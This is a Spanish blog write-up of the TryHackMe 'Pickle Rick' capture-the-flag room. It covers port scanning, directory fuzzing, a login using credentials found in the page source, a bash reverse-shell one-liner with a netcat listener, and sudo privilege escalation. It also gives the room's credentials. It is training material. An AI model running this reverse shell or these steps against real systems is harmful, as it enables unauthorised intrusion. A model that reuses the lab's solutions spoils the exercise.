---
layout: post
section-type: post
has-comments: true
title: Pickle Rick - TryHackMe Write-up
category: Writeups
tags: ["THM"]
---

[Pickle Rick](https://tryhackme.com/r/room/picklerick) es un nivel facil de la plataforma TryHackMe de nivel fácil. En esta máquina se tocan temas de WebHacking.


### Reconocimiento:
Primero hacemos un escaneo de puertos con **nmap**.
```bash
nmap -p- --open --min-rate 5000 -n -Pn -vvv 10.10.147.169 -oN escaneo 
```

si tienen dudas sobre que hace cada parametro aquí se los explico:
- **-p-**:  Indica que escanee todos los puertos , desde el 1 hasta el 65535. Sin este parámetro solo se escanea los 1000 puertos más comunes.
- **--open**: Solo escanear puertos abiertos.
- **-sS**: SYN Scan, también conocido como half-open scan, este no completa la conexión con el destino, esto hace el escaneo un poco más rápido y difícil de detectar.
- **-sC**: Activa la ejecución de scripts de detección predeterminados (Nmap Scripting Engine - NSE). Estos scripts realizan tareas de detecciones adicionales durante el escaneo, como:	- Detección de versiones de servicios.
	- Vulnerabilidades comunes.
	- Información adicional del servicio.
	- Configuraciones de seguridad.

- **-sV**: Encuentra la versión de servicio que corre en cada puerto.
- **--min-rate**: Fija la cantidad mínima de paquetes para enviar por segundo.
- **-n**: No resolución DNS.
- **-Pn**: Null Ping. Se usa por si el servidor esta bloqueando trazas ICMP.
- **-vvv**: Triple verbose. Hace que imprima la información mientras la va encontrando. Se puede modificar la cantidad de "v", el máximo es 3.
- **-oN**:  Se utiliza para guardar los resultados del escaneo en un archivo de salida en **formato normal** (normal output).  Siempre va acompañado del nombre del archivo donde se guardara.

<image src="/../img/picklerick/nmap-scaneo.png" alt="Escaneo de Nmap"></image>

Este escaneo nos muestra que la máquina tiene abiertos los puertos: 80(http) y 22(ssh).

Entramos a la página y hacemos un poco de exploración. 

<image src="/../img/picklerick/sitio.png" alt="Sitio"></image>

La página es muy sencilla por lo que nos brincamos directo a inspeccionar el código fuente, ahí encontramos algo muy interesante ¡un usuario!<br><br>

<image src="/../img/picklerick/user.png" alt="Usuario en Código fuente"></image>

<br>Una vez encontrado el usuario exploramos algunas rutas que siempre son de interes como `robots.txt` y `sitemaps.xml`. Al parecer no existe el archivo sitemaps pero dentro de robots encontramos un mensaje un poco extraño que guardaremos para después.

<image src="/../img/picklerick/robots.png" alt="Mensaje robost.txt"></image><br>

### Fuzzing
Para esta etapa usaremos gobuster, buscaremos subdominios interesantes y archivos con extensiones .php, .html y .txt

```bash
gobuster dir -u http://10.10.147.169 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<br><image src="/../img/picklerick/fuzzing.png" alt="Gobuster fuzzing"></image>

De los resultados más interesantes es el panel de login, en el cual intentamos ingresar utilizando el usuario `R1ckRul3s` y de contaseña `Wubbalubbadubdub`<br>

<br><image src="/../img/picklerick/login.png" alt="Panel de login"></image>

¡¡Funcionó!!

Dentro del panel nos encontramos con un panell de comandos. Le ingresamos el comando `whoami` para probar si funciona.

<image src="/../img/picklerick/command-panel.png" alt="Panel de comandos"></image>

### Exploit

Como se ve en la imagen, el comando funcionó. Ahora nos intentamos enviar una reverse shell para trabajar un poco más comodos desde la terminal.
```bash
bash -c  "sh -i >& /dev/tcp/<IP Victima>/<puerto> 0>&1"
```

No olviden ponerse en escucha para poder recibir la reverse shell:
```bash
sudo nc -lnvp <puerto>
```

<br><image src="/../img/picklerick/reverse-shell.png" alt="Revere Shell"></image>

Una vez recibida la shell exploramos archivos y vemos los primeros archivos interesantes en la ruta de `/var/www/html`.

<image src="/../img/picklerick/primer-ingrediente.png" alt="Primer ingrediente"></image>

El primer archivo interesante es `Sup3rS3cretPickl3Ingred.txt` en el cual esta el primer ingrediente que estamos buscando. El segundo archivo es `clue.txt` en el cual solo nos indican que tenemos que explorar en los demás archivos.

El primer lugar en el que buscamos es en la ruta del usuario rick `/home/rick/` y justo encontramos lo que buscabamos: `second ingridients`. 

<image src="/../img/picklerick/segundo-ingrediente.png" alt="Segundo ingrediente"></image><br>

### Escalada de privilegios

Para el tercer ingrediente buscaremos en la directorio `/root` pero primero necesitaremos escalar privilegios. Para esto ejecutamos el siguiente comando:
```bash
sudo -l
```
Este comando nos sirve para listar los comandos que el usuario puede ejecutar como **sudo**.
Los resultados nos muestan que el usuario `www-data` tiene permisos para ejecutar cualquier comando como sudo.

<image src="/../img/picklerick/sudo-l.png" alt="Sudo -l"></image>

Podemos escalar privilegios simplemente ejecutando el comando `sudo su`, después vamoms a la ruta `/root` en donde se encuentra el tercer ingrediente.


<image src="/../img/picklerick/tercer-ingrediente.png" alt="Tercer ingrediente"></image>


Y con esto logramos todos los objetivos de la máquina.

¡Saludos!
